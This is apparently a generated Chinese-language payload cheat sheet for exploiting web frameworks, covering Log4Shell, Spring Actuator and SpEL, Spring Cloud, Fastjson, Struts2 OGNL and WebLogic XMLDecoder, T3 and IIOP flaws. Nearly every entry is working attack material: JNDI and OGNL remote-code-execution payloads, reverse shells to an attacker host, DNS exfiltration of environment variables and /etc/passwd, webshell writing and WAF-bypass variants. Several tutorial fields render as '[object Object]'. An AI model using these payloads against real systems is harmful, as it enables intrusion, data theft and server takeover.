# 框架漏洞 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（18 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. Log4j RCE (Log4Shell)

- **id:** `log4j-rce`
- **分类:** 框架漏洞 / Log4j
- **tags:** `log4j` `rce` `cve-2021-44228` `log4shell`

Apache Log4j远程代码执行漏洞

**前置条件**

- 使用Log4j 2.x版本
- 用户输入被记录到日志

**利用步骤**

#### 1. 探测漏洞

```
在任意输入点注入:
${jndi:ldap://attacker.com/test}
观察是否有DNS回调
```

探测Log4j漏洞

| 片段 | 说明 | 类型 |
|---|---|---|
| `jndi:` | JNDI查找 | method |
| `ldap:` | LDAP协议 | method |

#### 2. DNS外带测试

```
${jndi:ldap://${env:USER}.attacker.com}
${jndi:ldap://${sys:java.version}.attacker.com}
外带环境变量或系统属性
```

外带敏感信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `${env:USER}` | 获取环境变量 | value |
| `${sys:java.version}` | 获取系统属性 | value |

#### 3. 构造恶意LDAP服务器

```
使用JNDIExploit或rogue-jndi:
java -jar JNDIExploit.jar -i attacker.com
构造payload:
${jndi:ldap://attacker.com:1389/Basic/Command/base64/d2hvYW1p}
```

构造RCE payload

| 片段 | 说明 | 类型 |
|---|---|---|
| `Basic/Command` | 执行命令的LDAP路由 | value |
| `base64` | Base64编码的命令 | encoding |

#### 4. 获取Shell

```
${jndi:ldap://attacker.com:1389/Basic/Command/base64/YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}
Base64解码为: bash -i >& /dev/tcp/attacker/4444 0>&1
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `base64` | Base64编码 | encoding |
| `jndi:` | JNDI查找 | method |
| `ldap:` | LDAP协议 | method |

> platform: `linux`

**WAF 绕过**

#### 绕过关键字过滤

```
${${lower:j}ndi:ldap://attacker.com}
${${upper:j}ndi:${lower:l}dap://attacker.com}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}
```

使用嵌套表达式绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `${lower:j}` | 将j转为小写 | value |
| `${::-j}` | 默认值语法 | value |

#### 绕过特殊字符过滤

```
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com}
${jndi:dns://attacker.com}
```

构造协议字符串

| 片段 | 说明 | 类型 |
|---|---|---|
| `jndi:` | JNDI查找 | method |

**教程**

[object Object]

---

### 2. Spring Actuator漏洞

- **id:** `spring-actuator`
- **分类:** 框架漏洞 / Spring
- **tags:** `spring` `actuator` `rce` `java`

Spring Boot Actuator端点安全漏洞

**前置条件**

- Spring Boot应用
- Actuator端点暴露

**利用步骤**

#### 1. 探测Actuator端点

```
/actuator
/actuator/env
/actuator/health
/actuator/mappings
/actuator/configprops
/actuator/heapdump
```

探测暴露的Actuator端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `/actuator` | Actuator根端点 | value |
| `/env` | 环境变量端点 | value |
| `/heapdump` | 堆转储端点 | value |

#### 2. 获取敏感信息

```
/actuator/env
查看数据库密码、API密钥等
/actuator/configprops
查看配置属性
```

获取环境变量和配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `/actuator/env` | 命令/关键字 | command |

#### 3. 下载堆转储

```
curl -o heapdump http://target.com/actuator/heapdump
使用Memory Analyzer Tool分析
搜索password、secret等关键词
```

下载并分析堆转储

| 片段 | 说明 | 类型 |
|---|---|---|
| `heapdump` | JVM堆内存转储 | value |

#### 4. env端点RCE

```
POST /actuator/env
Content-Type: application/x-www-form-urlencoded
spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} return null;}')

POST /actuator/restart
```

通过env端点执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `CONCAT` | 字符串拼接 | function |
| `EXEC` | 执行存储过程 | keyword |
| `;` | 命令分隔符 | operator |
| `Content-Type` | 内容类型头 | header |
| `Runtime.exec` | Java命令执行 | function |

**WAF 绕过**

#### 路径遍历与分号参数技巧

```
# 分号路径参数绕过(Spring特性):
/;/actuator/env
/actuator;.js/env
/actuator/..;/actuator/env

# 双URL编码:
/%61%63%74%75%61%74%6f%72/env
/actuator/%65%6e%76

# 路径穿越:
/random/../actuator/env
/api/v1/../../actuator/heapdump
```

Spring框架的分号路径参数特性允许在URL中插入分号段绕过路径匹配规则，结合双编码和路径穿越访问被限制的Actuator端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 分号路径参数绕过(Spring特性):` | 主要命令 | command |
| `...` | 共10行 | value |

#### HTTP方法覆盖与Content-Type绕过

```
# HTTP方法覆盖:
GET /actuator/env HTTP/1.1
X-HTTP-Method-Override: POST

# Content-Type绕过:
POST /actuator/env HTTP/1.1
Content-Type: application/x-www-form-urlencoded
spring.cloud.bootstrap.location=http://attacker.com/payload.yml

# 大小写绕过:
/Actuator/Env
/ACTUATOR/ENV
```

使用X-HTTP-Method-Override头覆盖请求方法，或通过非标准Content-Type和大小写变体绕过WAF对Actuator端点的POST请求拦截

| 片段 | 说明 | 类型 |
|---|---|---|
| `# HTTP方法覆盖:` | 主要命令 | command |
| `...` | 共10行 | value |

**教程**

[object Object]

---

### 3. Fastjson RCE

- **id:** `fastjson-rce`
- **分类:** 框架漏洞 / Fastjson
- **tags:** `fastjson` `rce` `deserialization` `java`

Alibaba Fastjson反序列化远程代码执行

**前置条件**

- 使用Fastjson库
- 存在反序列化点

**利用步骤**

#### 1. 探测Fastjson

```
发送JSON请求，观察响应:
{"@type":"java.net.Inet4Address","val":"attacker.com"}
观察是否有DNS回调
```

探测Fastjson版本

| 片段 | 说明 | 类型 |
|---|---|---|
| `@type` | Fastjson类型指定 | value |
| `java.net.Inet4Address` | 触发DNS解析的类 | value |

#### 2. JNDI注入

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```

JNDI注入RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `JdbcRowSetImpl` | 可利用的JDBC类 | value |
| `dataSourceName` | JNDI数据源名称 | value |
| `autoCommit` | 触发JNDI查找 | value |

#### 3. 搭建恶意服务

```
使用JNDIExploit:
java -jar JNDIExploit.jar -i attacker.com
或使用marshalsec:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389
```

搭建恶意LDAP/RMI服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用JNDIExploit:` | 命令/关键字 | command |

#### 4. 绕过AutoType检查

```
1.2.47版本绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```

绕过AutoType黑名单

| 片段 | 说明 | 类型 |
|---|---|---|
| `ldap:` | LDAP协议 | method |

**WAF 绕过**

#### Unicode编码与嵌套JSON绕过

```
# Unicode编码@type:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 十六进制编码:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 嵌套JSON混淆:
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```

通过Unicode(\u0040)、十六进制(\x40)编码@type字段名或嵌套JSON结构绕过WAF对Fastjson特征的检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `# Unicode编码@type:` | 主要命令 | command |
| `...` | 共6行 | value |

#### BCEL ClassLoader与版本特异链

```
# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):
{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","":"$$BCEL$$$l$8b..."}

# Fastjson 1.2.47 AutoType绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

# Fastjson 1.2.68 expectClass绕过:
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

针对不同Fastjson版本使用特异性利用链：BCEL ClassLoader加载字节码、1.2.47缓存投毒、1.2.68 expectClass白名单绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):` | 主要命令 | command |
| `...` | 共6行 | value |

**教程**

[object Object]

---

### 4. Spring SpEL注入

- **id:** `spring-spel`
- **分类:** 框架漏洞 / Spring SpEL
- **tags:** `spring` `spel` `expression` `rce`

Spring表达式语言注入攻击

**前置条件**

- 使用Spring框架
- 存在SpEL注入点

**利用步骤**

#### 1. 探测SpEL注入

```
# 测试表达式执行
${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime()}

# 观察响应
# 如果返回49或执行成功则存在漏洞
```

探测SpEL注入点

| 片段 | 说明 | 类型 |
|---|---|---|
| `${...}` | Spring表达式语法 | value |
| `#{...}` | SpEL表达式语法 | value |
| `T()` | 类型引用 | function |

#### 2. 命令执行

```
# Runtime执行命令
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(java.lang.Runtime).getRuntime().exec("whoami")}

# ProcessBuilder
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
#{new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}

# 反弹Shell
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

执行系统命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `T(java.lang.Runtime)` | 引用Runtime类 | value |
| `getRuntime()` | 获取Runtime实例 | function |
| `exec()` | 执行命令 | function |

#### 3. 文件读取

```
# 读取文件
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream())}

# 使用Scanner
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream()).useDelimiter("\\A").next()}

# 直接读取
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}
```

读取敏感文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `/etc/passwd` | 敏感文件路径 | path |
| `Runtime.exec` | Java命令执行 | function |

#### 4. DNS外带

```
# DNS外带数据
${T(java.net.InetAddress).getByName("attacker.com")}

# 外带文件内容
${T(java.net.InetAddress).getByName(T(java.lang.String).valueOf(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/etc/passwd"))).substring(0,20)+".attacker.com")}
```

DNS外带数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `getByName` | 解析域名触发DNS请求 | value |

**WAF 绕过**

#### 字符串拼接

```
# 绕过关键字过滤
${T(java.lang.Run"+"time).getRun"+"time().exec("id")}
#{T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("exec",T(String)).invoke(T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `Runtime.exec` | Java命令执行 | function |

#### 反射绕过

```
# 使用反射
#{T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# 使用ScriptEngine
#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\"id\\")")}
```

反射绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `eval()` | 代码执行 | function |
| `Runtime.exec` | Java命令执行 | function |

**教程**

[object Object]

---

### 5. Spring Cloud漏洞

- **id:** `spring-cloud`
- **分类:** 框架漏洞 / Spring Cloud
- **tags:** `spring` `cloud` `rce` `deserialization`

Spring Cloud相关漏洞利用

**前置条件**

- 使用Spring Cloud
- 存在漏洞版本

**利用步骤**

#### 1. Spring Cloud Gateway RCE

```
# CVE-2022-22947
# 添加恶意路由
POST /actuator/gateway/routes/hack HTTP/1.1
Content-Type: application/json

{
  "id": "hack",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

# 刷新路由
POST /actuator/gateway/refresh

# 查看结果
GET /actuator/gateway/routes/hack
```

Spring Cloud Gateway RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `actuator/gateway/routes` | Gateway路由管理端点 | encoding |
| `AddResponseHeader` | 添加响应头过滤器 | encoding |

#### 2. Spring Cloud Function SpEL

```
# CVE-2022-22963
# 修改请求头触发SpEL
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
Content-Type: text/plain

payload
```

Spring Cloud Function SpEL注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `spring.cloud.function.routing-expression` | 路由表达式头 | value |

#### 3. Spring Cloud Netflix

```
# CVE-2020-5410 目录遍历
GET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

# Eureka Server SSRF
POST /eureka/apps
# 配置serviceUrl指向内网服务
```

Spring Cloud Netflix漏洞

| 片段 | 说明 | 类型 |
|---|---|---|
| `%xx` | URL编码 | encoding |

**WAF 绕过**

#### 编码绕过

```
# URL编码绕过
..%252f = ..%2f = ../

# 双重URL编码
..%252f..%252f
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` URL编码绕过 ..%252f = ..%2f = ../  # 双重URL编码 ..%252f..%252f` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 6. Struts2远程代码执行

- **id:** `struts2-rce`
- **分类:** 框架漏洞 / Struts2
- **tags:** `struts2` `rce` `java` `apache`

Apache Struts2框架RCE漏洞

**前置条件**

- 使用Struts2框架
- 存在漏洞版本

**利用步骤**

#### 1. S2-045漏洞

```
# CVE-2017-5638
# Content-Type头注入
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

S2-045 Content-Type注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `multipart/form-data` | 触发漏洞的Content-Type | value |
| `#dm` | 默认成员访问权限 | value |
| `#cmd` | 要执行的命令 | value |

#### 2. S2-046漏洞

```
# CVE-2017-5638
# Content-Disposition注入
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vulnerable')}"

# 完整RCE
Content-Disposition: form-data; name="upload"; filename="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```

S2-046 Content-Disposition注入

#### 3. S2-057漏洞

```
# CVE-2018-11776
# URL命名空间注入
http://target/${(111+111)}/test.action
# 如果返回222则存在漏洞

# RCE
http://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action
```

S2-057 URL命名空间注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `OGNL` | OGNL表达式 | format |

#### 4. S2-061/S2-062漏洞

```
# CVE-2020-17530
# OGNL表达式注入
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d

# 解码后
id=%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.@java.lang.Runtime@getRuntime().exec('id')}
```

S2-061/062 OGNL注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `Content-Type` | 内容类型头 | header |
| `%xx` | URL编码 | encoding |
| `OGNL` | OGNL表达式 | format |
| `Runtime.exec` | Java命令执行 | function |

**WAF 绕过**

#### 编码绕过

```
# URL编码
%{#cmd} = %25%7b%23cmd%7d

# Unicode编码
\u0025{#cmd}

# 双重编码
%2525%257b%2523cmd%257d
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` URL编码 %{#cmd} = %25%7b%23cmd%7d  # Unicode编码 \%{#cmd}  # 双重编码 %2525%257b%2523cmd%257d` | 参数与载荷内容 | value |

#### 表达式变体

```
# 不同表达式语法
${...}
%{...}
#{...}
@{...}

# 使用静态方法
@java.lang.Runtime@getRuntime()
new java.lang.ProcessBuilder()
```

表达式变体绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 不同表达式语法 ${...} %{...} #{...} @{...}  # 使用静态方法 @java` | 模板表达式注入 | value |

**教程**

[object Object]

---

### 7. Struts2 OGNL表达式注入

- **id:** `struts2-ognl`
- **分类:** 框架漏洞 / Struts2 OGNL
- **tags:** `struts2` `ognl` `expression` `injection`

Struts2 OGNL表达式注入技术详解

**前置条件**

- 使用Struts2框架
- 存在OGNL注入点

**利用步骤**

#### 1. OGNL基础语法

```
# 访问对象属性
#object.property
#object['property']

# 调用方法
#object.method()
#object.method(arg1, arg2)

# 静态方法调用
@package.ClassName@method()
@java.lang.Runtime@getRuntime()

# 创建对象
new java.lang.String("test")
new java.lang.ProcessBuilder(new String[]{"id"})
```

OGNL基础语法

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 访问OGNL上下文变量 | value |
| `@` | 访问静态成员 | value |
| `new` | 创建新对象 | value |

#### 2. 绕过安全限制

```
# 获取DEFAULT_MEMBER_ACCESS
#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS

# 设置成员访问权限
#_memberAccess=#dm

# 清除排除类
#ognlUtil.getExcludedClasses().clear()
#ognlUtil.getExcludedPackageNames().clear()

# 完整绕过
(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))
```

绕过安全限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `OGNL` | OGNL表达式 | format |

#### 3. 命令执行技巧

```
# 使用Runtime
#cmd='id'
#cmds={'/bin/bash','-c',#cmd}
#p=new java.lang.ProcessBuilder(#cmds)
#process=#p.start()

# 获取输出
#is=#process.getInputStream()
#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
@org.apache.commons.io.IOUtils@copy(#is,#ros)

# 字符串输出
@org.apache.commons.io.IOUtils@toString(#process.getInputStream())
```

命令执行技巧

#### 4. 文件操作

```
# 读取文件
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()

# 写入文件
new java.io.FileOutputStream("shell.jsp").write(new sun.misc.BASE64Decoder().decodeBuffer("BASE64_SHELL").getBytes())

# 列出目录
new java.io.File("/").list()
```

文件操作

| 片段 | 说明 | 类型 |
|---|---|---|
| `/etc/passwd` | 敏感文件路径 | path |
| `base64` | Base64编码 | encoding |

**WAF 绕过**

#### 字符编码绕过

```
# Unicode编码
\u0069d = id
\u0027 = '

# 十六进制
\x69\x64 = id

# 字符串拼接
"i"+"d" = "id"
'id'.substring(0,2)
```

字符编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `\uXXXX` | Unicode编码 | encoding |

#### 反射绕过

```
# 使用反射调用
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")
```

反射绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 使用反射调用 #cls=@java.lang.Class@forName("java.lang.Runtime") #method=#cls.getMethod("getRuntime") #rt=#method.invoke(null) #exec=#cls.getMethod("exec",@java.lang.String@class) #exec.invoke(#rt,"id")` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 8. WebLogic远程代码执行

- **id:** `weblogic-rce`
- **分类:** 框架漏洞 / WebLogic
- **tags:** `weblogic` `rce` `java` `oracle`

Oracle WebLogic Server RCE漏洞

**前置条件**

- 使用WebLogic Server
- 存在漏洞版本

**利用步骤**

#### 1. CVE-2017-10271

```
# XMLDecoder反序列化
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

CVE-2017-10271 XMLDecoder

| 片段 | 说明 | 类型 |
|---|---|---|
| `wls-wsat` | WebLogic Web服务端点 | value |
| `ProcessBuilder` | Java进程构建器 | value |
| `void method="start"` | 调用start方法执行命令 | value |

#### 2. CVE-2019-2725

```
# 新版XMLDecoder绕过
POST /_async/AsyncResponseService HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

CVE-2019-2725 AsyncResponseService

| 片段 | 说明 | 类型 |
|---|---|---|
| `POST` | HTTP方法 | method |
| `Content-Type` | 内容类型 | header |

#### 3. CVE-2020-14882

```
# 未授权访问+命令执行
# 登录绕过
GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1

# 命令执行
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1
```

CVE-2020-14882 Console RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `%252e%252e` | 双重URL编码的.. | encoding |
| `ShellSession` | Coherence MVEL Shell | value |

**WAF 绕过**

#### 路径编码绕过

```
# 不同编码方式
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal
/console/css/..%252fconsole.portal
```

路径编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 不同编码方式 /console/css/..;/console.portal /console/css/%2e%2e/console.portal /console/css/%252e%252e/console.portal /console/css/..%252fconsole.portal` | 参数与载荷内容 | value |

#### XML变体

```
# 使用不同XML标签
<void class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<string>id</string>
</void>
</void>

# 使用数组形式
<array class="java.lang.String" length="1">
<void index="0"><string>id</string></void>
</array>
```

XML变体绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 使用不同XML标签 <void class="java.lang.Runtime" method="getRuntime"> <void method=` | 攻击载荷 | value |

**教程**

[object Object]

---

### 9. WebLogic T3协议攻击

- **id:** `weblogic-t3`
- **分类:** 框架漏洞 / WebLogic T3
- **tags:** `weblogic` `t3` `deserialization` `java`

WebLogic T3协议反序列化漏洞

**前置条件**

- WebLogic开放T3端口
- 存在漏洞版本

**利用步骤**

#### 1. 探测T3服务

```
# 扫描T3端口(默认7001)
nmap -sV -p 7001 target

# T3握手
echo "t3 12.2.1" | nc target 7001

# 如果返回HELO则存在T3服务
```

探测T3服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `t3 12.2.1` | T3协议版本握手 | value |

#### 2. 使用工具攻击

```
# 使用weblogic_exploit
git clone https://github.com/0xn0ne/weblogicScanner
cd weblogicScanner
python3 weblogic.py -t target -p 7001

# 使用WebLogicTool
java -jar WebLogicTool.jar -target target:7001 -cmd "id"

# 使用ysoserial
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "touch /tmp/pwned"
```

使用工具攻击

#### 3. 构造恶意T3请求

```
# Python脚本构造T3请求
import socket
import struct

def send_t3_payload(target, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    
    # T3握手
    sock.send(b"t3 12.2.1\n")
    response = sock.recv(1024)
    
    # 发送恶意序列化对象
    # 构造包含恶意对象的T3请求
    sock.send(payload)
    sock.close()

# 使用ysoserial生成payload
# java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
```

构造恶意T3请求

**WAF 绕过**

#### Gadget链选择

```
# 不同Gadget链
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsBeanutils1
Jdk7u21
Jre8u20

# 根据目标环境选择合适的链
```

Gadget链选择

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 不同Gadget链 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsBeanutils1 Jdk7u21 Jre8u20  # 根据目标环境选择合适的链` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 10. WebLogic IIOP协议攻击

- **id:** `weblogic-iiop`
- **分类:** 框架漏洞 / WebLogic IIOP
- **tags:** `weblogic` `iiop` `deserialization` `corba`

WebLogic IIOP协议反序列化漏洞

**前置条件**

- WebLogic开放IIOP端口
- 存在漏洞版本

**利用步骤**

#### 1. 探测IIOP服务

```
# 扫描IIOP端口	nmap -sV -p 7001 target

# IIOP使用相同端口
# 检测是否支持IIOP
# 使用工具检测
```

探测IIOP服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `nmap -sV` | 使用Nmap版本探测扫描目标端口服务 | command |
| `-p 7001` | WebLogic默认端口，IIOP和T3共用此端口 | parameter |
| `target` | 目标WebLogic服务器地址 | variable |

#### 2. CVE-2020-2551

```
# 使用weblogic_CVE_2020_2551
git clone https://github.com/Y4er/CVE-2020-2551
cd CVE-2020-2551

# 编译并运行
mvn package
java -jar target/CVE-2020-2551-1.0-SNAPSHOT.jar target 7001

# 使用JRMP监听
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"
```

CVE-2020-2551利用

| 片段 | 说明 | 类型 |
|---|---|---|
| `CVE-2020-2551` | WebLogic IIOP协议反序列化RCE漏洞 | command |
| `java -jar target/CVE-2020-2551.jar` | 运行编译好的漏洞利用工具 | command |
| `target 7001` | 目标地址和WebLogic端口 | value |
| `JRMPListener 8888` | 在攻击机启动JRMP监听接收反连 | parameter |
| `CommonsCollections1` | 指定返回给目标的Gadget链类型 | parameter |

#### 3. 构造IIOP请求

```
# 使用Python构造
# 需要安装相关库
pip install idna

# 使用JNDI注入
# 构造恶意JNDI引用
String jndiURL = "iiop://attacker:1099/Exploit";
Context ctx = new InitialContext();
ctx.lookup(jndiURL);

# 使用JNDIExploit工具
java -jar JNDIExploit.jar -i attacker_ip
```

构造IIOP请求

| 片段 | 说明 | 类型 |
|---|---|---|
| `iiop://attacker:1099/Exploit` | IIOP协议的JNDI查找URL | value |
| `ctx.lookup(jndiURL)` | JNDI查找触发远程类加载执行恶意代码 | command |
| `JNDIExploit.jar -i attacker_ip` | JNDI利用工具，-i指定攻击机IP | command |

